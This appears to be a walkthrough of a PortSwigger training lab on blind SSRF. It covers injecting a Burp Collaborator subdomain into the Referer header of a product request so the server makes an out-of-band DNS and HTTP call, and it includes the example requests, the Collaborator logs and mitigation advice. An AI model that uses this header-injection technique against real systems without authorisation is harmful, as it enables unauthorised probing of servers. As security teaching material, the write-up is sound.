# 📘 PortSwigger Lab: Blind SSRF with out-of-band detection

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-blind-ssrf-vulnerabilities/ssrf/blind/lab-out-of-band-detection  
> 🎯 Topic: Server-Side Request Forgery (SSRF) — Blind SSRF detection via OAST (Burp Collaborator)  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 What Is Blind SSRF and OAST](#oast)
- [🌐 The Role of the Referer Header](#referer)
- [⚡ Asynchronous Back-End Processing](#async)
- [🔍 Step 1 — Intercept the Product Request](#step1)
- [🔍 Step 2 — Generate a Burp Collaborator Payload](#step2)
- [🔍 Step 3 — Inject the Payload into the Referer Header](#step3)
- [🔍 Step 4 — Send the Request and Poll Interactions](#step4)
- [🔍 Step 5 — Verify DNS and HTTP Events](#step5)
- [📨 Example Intercepted Requests](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use the product page tracking mechanism to:

```text
1. Identify a Blind SSRF vulnerability triggered by the Referer header.
2. Force the server-side analytics software to make an out-of-band HTTP request to Burp Collaborator.
3. Solve the lab by proving out-of-band interaction.
```

<a id="theory"></a>

🧠 Short Theory
In standard (In-band) SSRF, the backend performs an HTTP request and reflects the output directly in the response body. In Blind SSRF, the backend triggers the request, but never reflects any response back to the client.

Common blind vectors include:

```text
- Analytics logging & referrer tracking.
- Webhook dispatchers & pingbacks.
- Document/PDF renderers and link preview parsers (OpenGraph).
- Internal worker queues processing metadata asynchronously.
Because there is zero visible reflection in HTTP responses, testers must rely on Out-of-band Application Security Testing (OAST) via a controlled external listener like Burp Collaborator.
```

<a id="idea"></a>

🧩 Core Idea
The application reads the standard HTTP Referer header to log traffic analytics. Instead of treating it as an untrusted string, the server initiates an outgoing HTTP request to fetch the URL specified in the header.

```text
Attacker sends:    Referer: https://xyz.oastify.com
Server analytics:  Parses Referer -> Resolves DNS -> Sends HTTP GET to xyz.oastify.com
Collaborator:      Logs DNS Query + HTTP GET interaction ✅
```

<a id="oast"></a>

📡 What Is Blind SSRF and OAST
Blind SSRF means the vulnerability exists entirely on the server side with no feedback channel in the application's HTTP response.

OAST (Out-of-band Application Security Testing) leverages external listeners to catch incoming connections triggered by the target server:

```text
- DNS Lookups: The target must resolve your domain name first. Often allowed through egress firewalls.
- HTTP Requests: If firewall egress permits outbound web traffic, an HTTP GET/POST request hits the listener.
```

<a id="referer"></a>

🌐 The Role of the Referer Header
The Referer header is populated by browsers to indicate the source URL that directed the user to the current page.

Developers often assume:

```text
"HTTP headers are metadata provided by standard browsers, not dangerous input parameters."
In reality, any HTTP header can be freely modified in Burp Suite, making headers like Referer, User-Agent, X-Forwarded-For, and Client-IP prime targets for Blind SSRF injection.
```

<a id="async"></a>

⚡ Asynchronous Back-End Processing
Analytics tasks are typically resource-intensive. To avoid slowing down user requests, applications often pass tasks to background message queues (e.g., Celery, RabbitMQ, Kafka).

As a result:

```text
- The initial HTTP response returns 200 OK almost instantly.
- The outbound SSRF request occurs a few seconds later.
- Polling in Collaborator must account for this execution delay.
```

<a id="step1"></a>

🔍 Step 1 — Intercept the Product Request
Navigate to any product in the lab.

Enable interception in Burp Proxy (Intercept on).

Refresh the page or click a product link.

Intercept the request:

http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
User-Agent: Mozilla/5.0 ...
Referer: https://LAB-ID.web-security-academy.net/
Send it to Repeater (Ctrl + R).

<a id="step2"></a>

🔍 Step 2 — Generate a Burp Collaborator Payload
Open the Collaborator tab in Burp Suite.

Click Copy to clipboard to generate a unique subdomain:

```text
YOUR-SUBDOMAIN.oastify.com
(Alternatively, in Repeater, right-click any text field and select "Insert Collaborator Payload".)
```

<a id="step3"></a>

🔍 Step 3 — Inject the Payload into the Referer Header
In Repeater, locate the Referer header.

Replace the original domain with your Collaborator payload:

http
Referer: https://YOUR-SUBDOMAIN.oastify.com
Note: You can use https:// or http://.

<a id="step4"></a>

🔍 Step 4 — Send the Request and Poll Interactions
Click Send in Repeater.

Inspect the HTTP response — it returns a normal 200 OK product page.

Switch to the Collaborator tab.

Click Poll now.

<a id="step5"></a>

🔍 Step 5 — Verify DNS and HTTP Events
Within a few seconds, the Collaborator interaction table populates:

```text
Type     Time                      Client IP       Details
DNS      2026-08-17 13:49:00 UTC   x.x.x.x         Name: YOUR-SUBDOMAIN.oastify.com (A)
HTTP     2026-08-17 13:49:01 UTC   x.x.x.x         Request: GET / HTTP/1.1
The presence of the HTTP request confirms that the server visited the external URL, completing the lab.

The lab banner updates to:

text
Solved
```

<a id="examples"></a>

📨 Example Intercepted Requests
Original Request
http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: https://LAB-ID.web-security-academy.net/
Connection: close
Exploit Payload (Repeater)
http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: https://BURP-COLLABORATOR-SUBDOMAIN.oastify.com
Connection: close
<a id="response"></a>

📥 Example Result
HTTP Response from Target (Silent Success)
http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 4321
Connection: close

<!DOCTYPE html>
<html>
    <head><title>Product Details</title></head>
    <body>
        <h1>Product 1</h1>
        <p>Product details displayed normally...</p>
    </body>
</html>
Burp Collaborator Log Capture
```text
[+] DNS Query:
    Lookup: Type A for BURP-COLLABORATOR-SUBDOMAIN.oastify.com
    Source IP: <PortSwigger DNS Internal Lab Resolver>

[+] HTTP Request:
    Method: GET
    Path: /
    Host: BURP-COLLABORATOR-SUBDOMAIN.oastify.com
    User-Agent: Java/17.0.x (or internal analytics crawler)
Lab status:

text
Solved
```

<a id="attack-chain"></a>

🧾 Complete Attack Chain
```text
1. Open product page and intercept GET /product?productId=1
2. Send request to Repeater
3. Generate unique Burp Collaborator subdomain (e.g. xyz.oastify.com)
4. Replace Referer header value with https://xyz.oastify.com
5. Send the modified request via Repeater
6. Server processes the request asynchronously in the background
7. Target server performs DNS lookup and issues HTTP GET to Collaborator
8. Poll Collaborator tab to capture incoming events
9. Lab marked as Solved
```

<a id="breakdown"></a>

🔬 Why the Attack Worked
1. Unvalidated Header Consumption
The analytics module blindly read the Referer header and treated its content as a URL to fetch.

2. Automatic Outbound Fetching
The server-side HTTP client did not restrict destination hosts or protocols when crawling referrer links.

3. Outbound Egress Allowed
The application environment allowed outbound network traffic to external public endpoints (specifically the Burp Collaborator domain pool).

<a id="pentester"></a>

🧠 Pentester Mindset
When testing web applications for Blind SSRF:

```text
Are there uninspected headers (Referer, User-Agent, X-Forwarded-For, Forwarded)?
text
Does the platform support webhooks, avatar URLs, PDF exports, or link unfurling?
text
Are tasks queued asynchronously? Always allow polling time.
text
Did you get only DNS or full HTTP? DNS proves injection even if egress firewall blocks HTTP.
```

<a id="mistakes"></a>

❌ Common Mistakes
Mistake 1. Looking for Server Responses in Repeater
Blind SSRF will never print data into the Repeater response window. Check Collaborator logs instead.

Mistake 2. Polling Collaborator Too Fast
Because processing happens asynchronously in a worker process, wait 3–5 seconds before hitting Poll now.

Mistake 3. Using Arbitrary External Domains
PortSwigger Academy blocks outbound requests to arbitrary private/public IPs. You must use the official Burp Collaborator server for Academy labs.

Mistake 4. Malformed Header Syntax
Ensure the Referer header contains a valid schema (http:// or https://).

<a id="defense"></a>

🛡 Mitigation
1. Avoid Unnecessary Outgoing Requests
Do not fetch URLs supplied in client-side headers unless strictly required by business logic.

2. Strict Whitelisting
If analytics tracking requires validating referrers, validate domain names against an allowlist of trusted partner domains.

3. Network Egress Filtering
Implement firewall egress rules that block application servers from initiating outbound connections to untrusted public networks or arbitrary ports.

4. Dedicated Isolated Workers
Run crawling and link-parsing microservices inside isolated network sandboxes with no access to internal corporate subnets.

<a id="checklist"></a>

✅ Checklist
Reconnaissance
- [ ] Navigated to product page
- [ ] Intercepted GET /product?productId=X
- [ ] Sent request to Repeater
Payload Generation
- [ ] Opened Burp Collaborator tab
- [ ] Generated and copied Collaborator subdomain
Execution & Verification
- [ ] Injected payload into Referer header
- [ ] Sent HTTP request in Repeater
- [ ] Polled Collaborator
- [ ] Captured DNS query and HTTP request
- [ ] Lab status: Solved
<a id="conclusion"></a>

🧾 Conclusion
The lab demonstrated discovering a Blind SSRF via Out-of-band (OAST) technique:

```text
1. Injected Collaborator domain into the Referer header
2. Triggered an asynchronous back-end fetch by analytics software
3. Confirmed SSRF through DNS & HTTP interaction logs in Burp Collaborator
Main lessons:

Blind SSRF does not return responses to the user — OAST is essential.
text
HTTP headers (Referer, User-Agent) are viable SSRF injection surfaces.
text
Even without seeing responses, Blind SSRF can be leveraged for internal mapping and RCE.
```
[⬆ Back to top](#top)
